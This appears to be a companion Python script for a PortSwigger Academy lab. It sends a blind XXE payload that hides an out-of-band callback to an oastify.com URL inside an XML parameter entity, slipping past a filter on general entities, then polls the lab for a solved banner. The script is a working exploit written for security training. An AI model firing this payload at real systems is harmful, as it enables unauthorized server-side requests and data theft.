#!/usr/bin/env python3
"""
Blind XXE with out-of-band interaction using XML parameter entities
PortSwigger Web Security Academy -- XXE Injection

Companion script for the writeup: 04-blind-xxe-with-out-of-band-interaction-using-parameter-entities.md

What this does:
    The application's parser blocks regular general entities outright, so
    this declares the OAST callback as a parameter entity instead
    (<!ENTITY % xxe SYSTEM "...">) and invokes it with %xxe; immediately
    inside the DOCTYPE, where the filter that only pattern-matches &name;
    references never sees it. productId stays a literal "1" -- there's
    nothing to reference a parameter entity with in the document body, since
    it's only valid inside the DTD. As with the previous lab, we poll the
    lab's own home page for the "Congratulations" banner rather than reading
    a Collaborator interaction log.

Usage:
    python 04-blind-xxe-with-out-of-band-interaction-using-parameter-entities.py <lab-url>

Requirements:
    pip install httpx
"""

import secrets
import sys
import time
import httpx


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15, verify=False)

    token = secrets.token_hex(16)
    oast = f"http://{token}.oastify.com"
    print(f"[*] OAST URL: {oast}")

    payload = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "{oast}">\n  %xxe;\n]>'
        '<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
    )
    r = client.post(
        f"{lab_url}/product/stock",
        content=payload,
        headers={"Content-Type": "application/xml"},
    )
    print(f"[*] Sent parameter-entity OOB payload: status={r.status_code}")

    print("[*] Waiting for the platform to auto-detect the interaction...")
    for i in range(12):
        time.sleep(10)
        check = client.get(lab_url)
        if "Congratulations" in check.text:
            print(f"[+] Lab solved -- parameter-entity interaction confirmed after ~{(i + 1) * 10}s.")
            return
        print(f"    still waiting ({(i + 1) * 10}s)...")

    print("[-] Not solved after 120s. Try re-running -- OAST callbacks can be delayed.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
